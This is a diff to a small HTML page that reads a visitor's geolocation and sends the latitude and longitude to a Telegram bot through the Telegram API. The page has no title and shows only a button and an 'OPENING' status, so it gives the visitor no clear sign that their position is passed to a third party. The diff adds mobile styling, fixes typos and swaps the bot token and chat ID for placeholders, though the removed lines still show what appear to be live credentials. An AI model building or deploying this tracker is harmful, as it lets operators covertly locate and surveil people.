@@ -2,6 +2,7 @@
 <html>
 <head>
     <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Responsive meta tag -->
     <style>
         body {
             background-color: black;
@@ -9,6 +10,15 @@
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
+            margin: 0; /* Remove default margin */
+        }
+        h1 {
+            font-size: 24px; /* Adjust font size for mobile */
+        }
+        button {
+            padding: 10px 20px; /* Add padding to the button */
+            font-size: 16px; /* Adjust button font size */
+            cursor: pointer; /* Change cursor on hover */
         }
     </style>
 </head>
@@ -32,8 +42,8 @@
 
             document.getElementById("status").textContent = "OPENING";
 
-            var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
-            var chatId = '5112680061'; // Replace with your chat ID
+            var token = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+            var chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
             var message = `Location: Latitude ${latitude}, Longitude ${longitude}`;
 
             var url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -60,7 +70,7 @@
                 if (data.ok) {
                     document.getElementById("status").textContent = "";
                 } else {
-                    document.getElementById("status").textContent = "Faild: " + data.description;
+                    document.getElementById("status").textContent = "Failed: " + data.description;
                 }
             })
             .catch(error => {
@@ -75,10 +85,10 @@
                     document.getElementById("status").textContent = "User denied the request";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    document.getElementById("status").textContent = "information is unavailable.";
+                    document.getElementById("status").textContent = "Information is unavailable.";
                     break;
                 case error.TIMEOUT:
-                    document.getElementById("status").textContent = "The request to get user timeout .";
+                    document.getElementById("status").textContent = "The request to get user timeout.";
                     break;
                 case error.UNKNOWN_ERROR:
                     document.getElementById("status").textContent = "An unknown error occurred.";
